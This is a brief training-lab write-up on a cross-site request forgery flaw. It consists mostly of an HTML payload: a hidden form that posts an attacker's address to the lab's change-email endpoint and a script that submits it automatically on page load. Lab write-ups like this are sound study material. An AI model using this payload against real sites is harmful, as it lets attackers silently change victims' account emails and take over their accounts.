
# Lab: CSRF vulnerability with no defenses


In this lab, there isn't any kind of protection. Thanks to the exploit server , the form will be submited directly otherwise 
in a real case scenario the user should just visit a website that i control with this malicious payload in order to modify his email.
 

## payload

```html
    <form id="my-formulaire" name="change-email-form" action="https://MYLAB.web-security-academy.net/my-account/change-email" method="POST">
        <input required type="email" name="email" value="evil@mail.com">
         <button class='button' type='submit'> Update email </button>
        </form>
    <script>
          let formulaire = document.getElementById("my-formulaire");
          formulaire.submit();
    </script>

```
